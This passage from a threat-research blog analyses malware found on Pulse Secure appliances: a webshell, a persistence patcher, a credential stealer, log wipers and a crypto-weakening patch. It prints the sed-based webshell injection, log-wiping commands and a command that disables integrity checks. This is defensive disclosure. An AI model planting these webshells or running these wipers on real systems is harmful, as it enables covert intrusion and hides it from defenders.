<p>The file <span class="code">compcheckjava.cgi</span> (SHA256: <span class="code">1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc</span>) has the ability to read and write arbitrary files and may execute arbitrary commands depending on the implementation of a particular library function.</p>
<p>The sample responds to HTTP GETs and PUTs. The GET path is not relevant, but the PUT path first checks if the incoming requests <span class="code">checkcode</span> POST param is equal to a hardcoded passcode. If this check passes the sample inspects the param <span class="code">hashid</span> to determine if it's non-empty. If non-empty the sample displays a prompt to the user that includes hardware information and then base64 decodes the param <span class="code">hashid</span> and checks it against pulsesecure. If this matches a recoveryToken is generated which is the MD5 hash of 16 random bytes, with the result hash truncated to 8 characters. This token is then displayed to the user via the URL <span class="code">https://ive-host/dana-na/auth/recover[.]cgi?token=&lt;varies&gt;</span> and the sample exits. If this check did not match then the sample passes the base64 decoded data to a routine <span class="code">DSSafe::psystem</span> which may execute shell commands, however this implementation is not provided and is speculation.</p>
<p>If the param hashid is empty the sample instead checks that the param <span class="code">m</span> is non-empty. If so, it's matched against get and put which will read/write arbitrary files to the host, respectively.</p>
<h5>ATRIUM</h5>
<p>The file <span class="code">compcheckresult.cgi</span> (SHA256: <span class="code">f2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90</span>) is a webshell capable of arbitrary command execution. The sample has malicious logic inserted at the end of legitimate logic. The malicious logic inspects all requests of any type looking for the HTTP query parameter <span class="code">id</span>. If this query parameter exists, the sample executes it verbatim on using the <span class="code">system</span> API. The sample does not encode or obfuscate the command in any way. If the query parameter is not found in the request, then the original legitimate logic is invoked.</p>
<h5>Persistence Patcher</h5>
<p>The file <span class="code">DSUpgrade.pm</span> (SHA256: <span class="code">224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450</span>) is a patcher utility script responsible for persisting webshells across a system upgrade. Weâ€™ve observed variants of this utility targeting the persistence of multiple webshell families, notably ATRIUM, STEADYPULSE, and PULSECHECK. Like previous patchers, this sample uses <span class="code">sed</span> to insert malicious logic. The attacker likely chose <span class="code">DSUpgade.pm</span> to host their patch logic as it is a core file in the system upgrade procedure, ensuring the patch is during updates. The patcher modifies content in <span class="code">/tmp/data</span> as this directory holds the extracted upgrade image the newly upgraded system will boot into. This results in a persistence mechanism which allows the attacker to maintain access to the system across updates.</p>
<p><span class="code">my $cmd_x=&quot;sed -i '/echo_console \&quot;Saving package\&quot;/i(<br>
&nbsp; &nbsp; sed -i \\\'/main();\\\$/cif(CGI::param(\\\\\&quot;id\\\\\&quot;)){<br>
&nbsp; &nbsp; &nbsp; &nbsp; print \\\\\&quot;Cache-Control: no-cache\\\\\\\\n\\\\\&quot;;<br>
&nbsp; &nbsp; &nbsp; &nbsp; print \\\\\&quot;Content-type: text/html\\\\\\\\n\\\\\\\\n\\\\\&quot;;<br>
&nbsp; &nbsp; &nbsp; &nbsp; my \\\\\$na=CGI::param(\\\\\&quot;id\\\\\&quot;);<br>
&nbsp; &nbsp; &nbsp; &nbsp; system(\\\\\&quot;\\\\\$na\\\&quot;);<br>
&nbsp; &nbsp; } else{<br>
&nbsp; &nbsp; &nbsp; &nbsp; &amp;main();<br>
&nbsp; &nbsp; }\\\' /tmp/data/root$cgi_p;<br>
&nbsp; &nbsp; cp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl;<br>
&nbsp; &nbsp; cp -f /pkg/dspkginstall /tmp/data/root/pkg/;<br>
)'/pkg/do-install&quot;;</span></p>
<p>The patcher also performs additional shell commands for unpacking a compressed package:</p>
<p><span class="code">system(&quot;/bin/mount -o remount,rw /dev/root /&quot;);<br>
system(&quot;/bin/tar&quot;, &quot;-xzf&quot;, &quot;/tmp/new-pack.tgz&quot;, &quot;-C&quot;, &quot;/tmp&quot;,&quot;./installer&quot;);<br>
system(&quot;cp -f /tmp/installer/do-install /pkg/&quot;);<br>
system(&quot;cp -f /tmp/installer/VERSION /pkg/&quot;);<br>
system(&quot;cp -f /tmp/installer/sysboot-shlib /pkg/&quot;);<br>
system(&quot;cp -f /tmp/installer/losetup /pkg/&quot;);</span></p>
<h5>PACEMAKER</h5>
<p>The file <span class="code">memread</span> (SHA256: <span class="code">68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2</span>) is a credential stealer. The sample has the usage information:</p>
<p><span class="code">Usage: memread [-t time(minute)] [-m size(MB)] [-s sleep_interval(second)]</span></p>
<p>The sample starts by setting an alarm that kills the application after a configurable number of minutes, 14 by default. It then enters a loop which reads <span class="code">/proc/</span> entries every 2 seconds looking for a target application, this interval is also configurable. The target is found by opening <span class="code">/proc/&lt;process_name&gt;/cmdline</span> for each entry in the folder and then reading this file looking for the string <span class="code">dswsd</span> within the command line. Once found the target application's <span class="code">proc/&lt;target_pid&gt;/mem</span> is opened, the process is attached to with PTRACE, then memory read in chunks up to 512 bytes in size. For each chunk, the string <span class="code">20 30 20 0A 00 ( 0 \n)</span> is searched for as a needle. If found the sample splits the data by first space, then a dash -. Two dashes are expected to be found, and these are immediately converted into hex numbers, example form: -&lt;number&gt;. If the second number minus the first is &gt; 8191 the sample reads the data starting at the file offset of the first number, up to a size specified by second number minus first number.</p>
<p>Once the sample has read the process memory and found all memory data of interest the sample detaches PTRACE then the sample begins memory scanning the copied data. The sample tries to locate a sequence of 'flags' in memory one by one to locate what seem to be information the attacker wishes to steal. This information is not known, nor is the structure of it. The sequences scanned for generally have start and end scan sequences which in order scanned for, are:</p>
<p><span class="code">USER_START_FLAG: 3C 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 05 00<br>
USER_END_FLAG: 3C 2F 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 00<br>
PASSWORD_START_FLAG: 3C 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00<br>
PASSWORD_END_FLAG: 3C 2F 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00<br>
AUTHNUM_START_FLAG: 3C 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00<br>
AUTHNUM_END_FLAG: 3C 2F 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00</span></p>
<p>If all these sequences are found, the data between the start and end is extracted and eventually formatted and written to the file <span class="code">/tmp/dsserver-check.statementcounters</span>. The approximate format of this data is:</p>
<p><span class="code">Name:&lt;username&gt; || Pwd:&lt;password&gt; || AuthNum:&lt;authnumber&gt;\n</span></p>
<p>The sample replaces the following URL encoded values with their ascii representation for the password:</p>
<p><span class="code">&amp;amp; -&gt;&nbsp; &amp;<br>
&amp;lt;&nbsp; -&gt;&nbsp; &lt;<br>
&amp;gt;&nbsp; -&gt;&nbsp; &gt;</span></p>
<h5>PACEMAKER Launcher Utility</h5>
<p>As part of our investigation into PACEMAKER we were able to retrieve a simple bash script responsible for launching the credential stealer. The launcher script hash SHA256 <span class="code">4c5555955b2e6dc55f52b0c1a3326f3d07b325b112060329c503b294208960ec</span> launches PACEMAKER from a hardcoded path with options specifying a 16MB memory read size and a memory scan interval of 2 seconds, with a variable self-kill time.</p>
<p><span class="code">#!/bin/bash</span></p>
<p><span class="code">/home/bin/memread -t $1 -m 16 -s 2 &amp;</span></p>
<h5>THINBLOOD Log Wiper Utility</h5>
<p>The file <span class="code">dsclslog</span> with SHA256 <span class="code">88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079</span> is a log wiper utility. The sample provides the usage information:</p>
<p><span class="code">Usage: dsclslog -f [events|access] -r [Regex1,Regex2,Regex3,...]</span></p>
<p>The <span class="code">â€“f</span> flag specifies if the file <span class="code">log.events.vc0</span> or <span class="code">log.access.vc0</span> within the directory <span class="code">/home/runtime/logs</span> should be modified. To perform its log cleaning operations the sample first makes two copies of whichever log file was chosen, but uses <span class="code">.vc1</span> and <span class="code">.vc2</span> as the extension for the new files. The file with the <span class="code">.vc1</span> is used to search for entries that match the given entries, and the file with the <span class="code">.vc2</span> extension is used as a temporary file where the cleaned log is written. After generating both files and log cleaning is finished the sample executes the following commands via the system API to overwrite the original log with the cleaned version, then removes the intermediate:</p>
<p><span class="code">mv /home/runtime/logs/log.&lt;logtype&gt;.vc2<br>
/home/runtime/logs/log.&lt;logtype&gt;.vc0<br>
rm /home/runtime/logs/log.&lt;logtype&gt;.vc1</span></p>
<h5>THINBLOOD LogWiper Utility Variant</h5>
<p>The file <span class="code">clear_log.sh</span> (SHA256: <span class="code">1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9</span>) is a BASH script responsible for zeroing log lines that match a given regex pattern. The sample is similar to the compiled <span class="code">THINBLOOD</span> Log Wiper but edits logs in-place with sed rather than making temporary copies. The sed commands used are:</p>
<p><span class="code">sed -i &quot;s/.\x00[^\x00]*&lt;regex_string&gt;[^\x00]*\x09.\x00//g&quot; /data/runtime/logs/&lt;logfile&gt;</span></p>
<p><span class="code">sed -i &quot;s/\x&lt;hex_char&gt;\x00[^\x00]*$2[^\x00]*\x09\x&lt;hex_char&gt;\x00//g&quot; /data/runtime/logs/&lt;logfile&gt;</span></p>
<p>The sample embeds the usage information:</p>
<p><span class="code">usage: /home/bin/bash clear_log.sh [logfile] [keyword(regex)]</span></p>
<h5>LOCKPICK</h5>
<p>The file <span class="code">libcrypto.so</span> (SHA256: <span class="code">2610d0372e0e107053bc001d278ef71f08562e5610691f18b978123c499a74d8</span>) is a shared object containing cryptographic logic from openssl. The sample contains a modification to the routine <span class="code">bnrand_range</span> that breaks the security of the random numbers generated. There are three paths in this routine for generating a random big number between a given range. The first case is unmodified and generates a zeroed big number, the other two cases are patched so that a constant value overwrites the generated random value and always returns success. This breaks the random number generation by replacing it with a value the attacker knows in all cases.</p>
<h5>LOCKPICK Patcher</h5>
<p>The file with the hash <span class="code">b990f79ce80c24625c97810cb8f161eafdcb10f1b8d9d538df4ca9be387c35e4</span> is a patcher utility responsible for inserting the malicious logic known as LOCKPICK. The patcher starts by running sed on the integrity checker script built into the appliance to insert an early exit routine. This is inserted by the command <span class="code">sed -i '12aexit 0' /home/bin/check_integrity.sh</span> which when applied causes this script to exit without performing its intended checks. After this the sample uses python file read/write APIs to insert long strings of assembly that represent the logic known as LOCKPICK. This file is different from the other patchers weâ€™ve identified in that it is python and specifically targets system integrity routines.</p>
<h4>Acknowledgements</h4>
<p>Mandiant would like to thank the Stroz Friedberg DFIR and Security Testing teams for their collaboration with the analysis and research. The team would also like to thank Joshua Villanueva, Regina Elwell, Jonathan Lepore, Dimiter Andonov, Josh Triplett, Jacob Thompson and&nbsp;Michael Dockry for their hard work in analysis and blog content.</p>
</div>
<div class="clear-all"></div></div>
</div>
<div class="par prevnextbutton">
<div class="prevnext">
<div class="button">
<a id="leftBtnId" class="btn btn-B2282D" href="#"><span>Previous</span> <span>Post</span></a>
</div>
<div class="button">
<a id="rightBtnId" class="btn btn-B2282D" href="#"><span>Next</span> <span>Post</span></a>
</div>
</div>
<input type="hidden" value="/content/fireeye-www/en_US/blog/threat-research" id="categoryPathVal" name="categoryPath" />
<script>
    $(document).ready(function(){

         var prevenextHtml = $('.prevnext').html();	
         var categoryPathVal = $("#categoryPathVal").val();
            var blogsDetails;
        
            if(undefined == blogsDetails){
                    blogsDetails = [];
            }
        
        
            if(undefined != prevenextHtml){
                if(blogsDetails.length <= 0){
                     $.ajax({
                        type: "GET",
                        url: "/bin/www-blogs/read-blogentries",
                        dataType: "json",
                        data: { categoryPath: categoryPathVal} ,
                        async: false,
                        success : function(data) {
                            var totalFoundRes = data.blogs.length;
                            blogsDetails = data.blogs;
                            var currentPagePath = window.location.pathname;
                            currentPagePath = currentPagePath.split(".")[0]
                            console.log("currentPagePath :: "+currentPagePath);
        
                            for (var i = 0; i < blogsDetails.length; i++) {
                                var currentItrPath = blogsDetails[i].path;
        
                                if (currentItrPath.indexOf(currentPagePath) > -1) {
                                    console.log(blogsDetails[i-1]);
                                    console.log(blogsDetails[i+1]);

                                    if(undefined != blogsDetails[i-1] ){
										var prevPagePath = blogsDetails[i-1].path;
                                        $("#leftBtnId").attr("href",prevPagePath+".html");
                                        $("#leftBtnId").show();
                                    }else{
										$("#leftBtnId").hide();
                                    }
                                    if(undefined != blogsDetails[i+1] ){
										var nextPagePath = blogsDetails[i+1].path;  
                                    	$("#rightBtnId").attr("href",nextPagePath+".html");
                                        $("#rightBtnId").show();
                                    }else{
										$("#rightBtnId").hide();
                                    }
                                }
                            }
        
                        },
                        error : function(response){
                            console.log("Error: while connecting to servlet.");
                        }
                    });
                 }else{
                     alert("Blogs from global object :: "+blogsDetails);
                 }
            }else{
                alert("prevenextHtml :: "+prevenextHtml);
            }
    });
</script></div>
</div></div>
</div>
</div>
<div id="sidebar" class="g-u-7-24 l_g-u-1 blog-sidebar">
<div class="g-content">
<div class="sidebar reuse-blog-resources">
<div class="blog-resources">
<div class="grid-33-left parsys"><div class="rightrail section">
<div class="blog-right-rail">
<div class="bottom-bar"><div class="tab">
<span class="ficon ficon-star"></span>
<p>Promotion</p></div><div class="tab">
<span class="ficon ficon-checkbox-checked"></span>
<p>Subscribe</p></div>
<div class="tab">
<span class="ficon ficon-share"></span>
<p>Share</p></div>
<div class="tab">
<span class="ficon ficon-history2"></span>
<p>Recent</p></div>
<div class="tab">
<span class="ficon ficon-feed"></span>
<p>RSS</p></div>
</div><div class="section cta">
<div id="cq-image-jsp-/content/fireeye-www/site-content/en_US/blog-right-threat-research/jcr:content/grid-33-left/rightrail/image"><a href="/mandiant/advantage.html"><img src="/content/dam/fireeye-www/services/images/bnr-mandiant-advantage-v3-315x315.png" alt="bnr-mandiant-advantage-v3-315x315" title="bnr-mandiant-advantage-v3-315x315" class="cq-dd-image"></a></div></div><div class="section email">
<script src="https://www2.fireeye.com/js/forms2/js/forms2.min.js"></script>
<div id="mktoWrapper_3353" class="a08 bg-f2f2f2"><div class="c00 c00v0"><h3>Subscribe to Blogs</h3><p>Get email updates as new blog posts are added.</p></div><form id="mktoForm_3353"></form> <script type="text/javascript">
		if(typeof digitalData=="undefined"){digitalData={}}
        //alert(https://www2.fireeye.com+":"+848-DID-242)
        //alert("false");
		MktoForms2.loadForm("https://www2.fireeye.com", "848-DID-242", 3353,
		function(form) {
			
            if(typeof fdc.blog.initCheckboxes === "function") {
                fdc.blog.initCheckboxes(form);
            } 
			digitalData.form = {id: form.getId(),name: document.title,url: window.location.href};
			//if(typeof marketoFormViewTealiumEvent !== "undefined" && typeof utag!=="undefined"){marketoFormViewTealiumEvent(form);}
			if(typeof marketoFormViewGtmEvent !== "undefined") {
				marketoFormViewGtmEvent(form);
			}
			form.onSubmit(function(values){
                //Check if GA fields are present
                if(($("input[name='GACLIENTID__c']").length>0)&&($("input[name='GAUSERID__c']").length>0)&&($("input[name='GATRACKID__c']").length>0)&&(typeof ga!=="undefined"))
                {
                      ga(function(){ 
                          //Get tracking ID and Client ID
                           var tracker = ga.getAll()[0];
                           var trackingId = tracker.get('trackingId');
                           var clientId = tracker.get('clientId');
                           var userId = tracker.get('userId');
                           $("input[name='GACLIENTID__c'").val(clientId);
                           $("input[name='GATRACKID__c'").val(trackingId);
                           $("input[name='GAUSERID__c'").val(userId);
                       });
                 }
            
        	});
			form.onSuccess(function(values, followUpUrl) {
				//if(typeof marketoFormSubmitTealiumEvent !== "undefined"){marketoFormSubmitTealiumEvent(values);}
				if(typeof marketoFormSubmitGTMEvent !== "undefined") {
					marketoFormSubmitGTMEvent(values);
				}
				
				if(typeof fdc.blog.replaceFormWithThankYou === "function") {
					var result = fdc.blog.replaceFormWithThankYou(form,values,followUpUrl);
					if (result === false) {
						return false;
					}
				} 
				return true;
			});
			
			var adrC = typeof addMissingUTMsFromCookies !== "undefined" ? addMissingUTMsFromCookies(document.URL) : document.URL;
			form.addHiddenFields({ ADR__c: adrC,ADR_Credit__c_account: document.title,ADR_Credit__c: document.referrer });
			if(($("input[name='GACLIENTID__c']").length==0)&&($("input[name='GAUSERID__c']").length==0)&&($("input[name='GATRACKID__c']").length==0)){
				form.addHiddenFields({ GACLIENTID__c:"",GAUSERID__c:"",GATRACKID__c:""});				
			}
			
		});
	</script>
</div></div>
<div class="section share">
<h6><small>Share</small></h6>

<div class="addthis_inline_share_toolbox_7uq8"></div>
</div>
<div class="section recent">
<h6>Recent Posts</h6>

<div class="c05 c05v0"><ul>
<li class="c05_item"><p class="c05_date">20 Apr 2021</p><a class="c05_link" href="/blog/threat-research/2021/04/zero-day-exploits-in-sonicwall-email-security-lead-to-compromise.html" title="Zero-Day Exploits in SonicWall Email Security Lead to Enterprise Compromise">Zero-Day Exploits in SonicWall Email Security Lead to Enterprise Compromise</a></li>

<li class="c05_item"><p class="c05_date">20 Apr 2021</p><a class="c05_link" href="/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html" title="Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day">Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass
Techniques and Pulse Secure Zero-Day</a></li>

<li class="c05_item"><p class="c05_date">13 Apr 2021</p><a class="c05_link" href="/blog/threat-research/2021/04/hacking-operational-technology-for-defense-lessons-learned.html" title="Hacking Operational Technology for Defense: Lessons Learned From OT Red Teaming Smart Meter Control Infrastructure">Hacking Operational Technology for Defense: Lessons Learned From OT Red
Teaming Smart Meter Control Infrastructure</a></li>
</ul></div>
</div>
<a href="/content/fireeye-www/en_US/blog/threat-research/_jcr_content.feed" target="_blank">
<div class="section rss">
<h6><small>RSS Feed: </small><small>Stay Connected</small></h6>
<span class="ficon ficon-feed"></span>
</div>
</a>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</main>

<div class="footer_f635 footer">

<footer id="g03-footer" class="l_footer g03 g03v0 g03v2 g03-5col">
<div class="main-footer-wrapper">

 <div class="g03_list g03_list_1">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Company</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/company.html" class="Footer">Why FireEye?</a></li>
<li class="g03_item"><a href="/customers.html" class="Footer">Customer Stories</a></li>
<li class="g03_item"><a href="/company/jobs.html" class="Footer">Careers</a></li>
<li class="g03_item"><a href="/company/compliance-certification.html" class="Footer">Certifications and Compliance</a></li>
<li class="g03_item"><a href="http://investors.fireeye.com/" target="_blank" class="Footer">Investor Relations</a></li>
<li class="g03_item"><a href="/company/supplier.html" class="Footer">Supplier Documents</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_2">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>News and Events</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/company/newsroom.html" class="Footer">Newsroom</a></li>
<li class="g03_item"><a href="/company/press-releases.html" class="Footer">Press Releases</a></li>
<li class="g03_item"><a href="/company/webinars.html" class="Footer">Webinars</a></li>
<li class="g03_item"><a href="/company/events.html" class="Footer">Events</a></li>
<li class="g03_item"><a href="/company/awards.html" class="Footer">Awards and Honors</a></li>
<li class="g03_item"><a href="/company/contact-us/manage-your-communication-preference.html" class="Footer">Email Preferences</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_3">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Technical Support</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/company/incident-response.html" class="Footer">Incident?</a></li>
<li class="g03_item"><a href="/company/security.html" class="Footer">Report Security Issue</a></li>
<li class="g03_item"><a href="/support/contacts.html" class="Footer">Contact Support</a></li>
<li class="g03_item"><a href="https://csportal.fireeye.com/secur/login_portal.jsp?orgId=00D3000000063LS&portalId=06030000000pSNE" target="_blank" class="Footer">Customer Portal</a></li>
<li class="g03_item"><a href="https://community.fireeye.com/s/support-community" target="_blank" class="Footer">Communities</a></li>
<li class="g03_item"><a href="https://docs.fireeye.com" target="_blank" class="Footer">Documentation Portal</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_4">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>FireEye Blogs</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/blog/threat-research.html" class="Footer">Threat Research</a></li>
<li class="g03_item"><a href="/blog/products-and-services.html" class="Footer">FireEye Stories</a></li>
<li class="g03_item"><a href="/blog/executive-perspective.html" class="Footer">Industry Perspectives</a></li>
</ul></div>
<div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Threat Map</strong></p></div>
<div class="footer-list section">
<ul class="g03_block"><li class="g03_item"><a href="/cyber-map/threat-map.html" class="Footer">View the Latest Threats</a></li>
</ul></div>
</div>
</div>
<div class="g03_list g03_list_5">
<div class="parsys"><div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Contact Us</strong><br>
<div class="footer-list section">
<ul class="g03_block">
<li class="g03_item"><a href="tel:+1 877-347-3393" class="contactlinks">+1 877-347-3393</a><br>&nbsp;</li>
</ul>
</div></div>
<div class="htmlpassthru section">
<p style="margin-bottom:6px"><strong>Stay Connected</strong></p></div>
<div class="followus-footer section"><h4 class="g03_title" id="g03-followus-title"> </h4><ul class="g03_block g03-s" id="g03-followus-list"><li class="g03_item g03_item-s">
<a href="https://www.linkedin.com/company/fireeye" target="_blank">
<span class="g03-s-i ficon g03-s-i-li ficon-linkedin"></span>
<span class="g03-s_label">LinkedIn</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://twitter.com/fireeye" target="_blank">
<span class="g03-s-i ficon g03-s-i-tw ficon-twitter2"></span>
<span class="g03-s_label">Twitter</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://www.facebook.com/FireEye" target="_blank">
<span class="g03-s-i ficon g03-s-i-fb ficon-facebook2"></span>
<span class="g03-s_label">Facebook</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://www.youtube.com/user/FireEyeInc" target="_blank">
<span class="g03-s-i ficon g03-s-i-yt ficon-youtube2"></span>
<span class="g03-s_label">YouTube</span>
</a>
</li><li class="g03_item g03_item-s">
<a href="https://itunes.apple.com/us/podcast/eye-on-security/id1073779629?mt=2" target="_blank">
<span class="g03-s-i ficon g03-s-i-pc ficon-podcast"></span>
<span class="g03-s_label">Podcast</span>
</a>
</li></ul>
</div>
<div class="htmlpassthru section">
<div class="country-notification">
<div id="c08_modal-lang" class="c08_modal lang">
<div class="c08 c08v1">
<div class="c08_header">
<a href="#dismiss-lightbox" class="ficon ficon-close c08_dismiss" data-behavior="dismiss-c08"></a>
</div>
<div class="c08_content">
<div class="c08_body">
<div class="col FR">
<p class="type-ML">Cette page est Ã©galement disponible en franÃ§ais.</p>
<div class="button section"><a class="btn" href="/index.html">Version franÃ§aise</a></div>
</div>
<div class="col DE">
<p class="type-ML">Diese Seite ist auch auf Deutsch verfÃ¼gbar</p>
<div class="button section"><a class="btn" href="/index.html">Zur deutschen Seite wechseln</a></div>
</div>
<div class="col JP">
<p class="type-ML">æ—¥æœ¬èªžãƒšãƒ¼ã‚¸ã‚’</p>
<div class="button section"><a class="btn" href="/index.html">è¦‹ã‚‹</a></div>
</div>
<div class="col KR">
<p class="type-ML">í•´ë‹¹ íŽ˜ì´ì§€ëŠ” í•œê¸€ ë²„ì „ìœ¼ë¡œ ë³´ì‹¤ ìˆ˜ ìžˆìŠµë‹ˆë‹¤</p>
<div class="button section"><a class="btn" href="/index.html">ë°”ë¡œ ê°€ê¸°</a></div>
</div>
<hr>
<div class="col">
<p><a class="dismiss" href="#dismiss-lightbox" data-behavior="dismiss-c08">Continue viewing this page in English</a></p>
</div>
</div>
</div>
</div>
</div>
<style>
.c08_modal.lang {
    background: rgba(255,255,255,0.8);
}
.c08_modal.lang .c08_header {
    background: transparent;
    border-left: none;
}
.c08_modal.lang .c08 {
    top: 20%;
    width: 600px;
    border-radius: 12px;
    box-shadow: rgba(0, 0, 0, 0.37) 0 0 15px;
    border: 1px solid #b4b5b8;
    background-image: url("/content/dam/fireeye-www/fw/images/bg-language-select.jpg");
    background-position: right bottom;
    margin: 0 auto;
    position: relative;
    max-width: 90%;
}
.c08_modal.lang .c08_dismiss {
    color: #222;
}
.c08_modal.lang .c08_body {
    padding: 12px 50px 60px;
}
.c08_modal.lang .col {
    display: none;
}
.c08_modal.lang .col:last-child {
    display: block;
}
.c08_modal.lang .btn {
    margin-bottom: 0;
}
.c08_modal.lang hr {
    margin: 30px 80px;
}
.c08_modal.lang hr:before {
    border-bottom: none;
}
</style>
</div></div>
</div>
</div></div>
<div class="legal-footer-wrapper">
<div class="legal-footer">
<div class="g03_copyright">
<p class="g03_copyright_p">
Copyright&nbsp;&copy;&nbsp;2021&nbsp;FireEye, Inc.&nbsp;All rights reserved.&nbsp;<span class="g03-legal"><a href="/company/privacy.html">Privacy &amp; Cookies Policy</a> | <a href="/company/privacy-shield-commitment.html">Privacy Shield</a> | <a href="/company/legal.html">Legal Documentation</a></span>
</p>
</div><div class="g03_languages">
<a class="g01_options-option" href="#footer-worldwide">
<span>Site Language</span>
<span>English<span class="ficon ficon-globe"></span></span>
</a>
<div class="option-menu" id="footer-worldwide">
<p><strong>My preferred language:</strong></p>
<ul class="g01_options_list"><li><a href="https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html" target="_blank">English (English)</a></li>
<li><a href="https://www.fireeye.fr" target="_blank">French (FranÃ§ais)</a></li>
<li><a href="https://www.fireeye.de" target="_blank">German (Deutsch)</a></li>
<li><a href="https://www.fireeye.jp" target="_blank">Japanese (æ—¥æœ¬èªž)</a></li>
<li><a href="https://www.fireeye.kr" target="_blank">Korean (í•œêµ­ì–´)</a></li>
<li><a href="/products/international-literature.html">More languages</a></li>
</ul>
</div>
</div> </div>
</div>
</footer>
</div>
<script type="text/javascript" src="/etc/designs/fireeye-www/clientlibs_fw.min.js"></script>


<div class="htmlpassthru_c66c htmlpassthru">

<script>
function changeSlide(a) {
    if(isNaN(a)){console.log("updating i");i=2;a=2;}
	$('#uc-he01_carousel').removeClass('uc-he01_s-1 uc-he01_s-2 uc-he01_s-3 uc-he01_s-4 uc-he01_s-5');
	$('.uc-he01_sc_s, .uc-he01_c_btn').removeClass('is-active');
	$('#uc-he01_sc_s-'+(a)+', [data-target="'+(a)+'"]').addClass('is-active animate');
	window.setTimeout(function() {$('.uc-he01_sc_s, .uc-he01_c_btn').not('#uc-he01_sc_s-'+(a)).removeClass('animate');}, 1000);
	$('#uc-he01_carousel').addClass('uc-he01_s-'+(a));
}
</script></div>

<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=fewebadmin"></script>
</body>
</html>
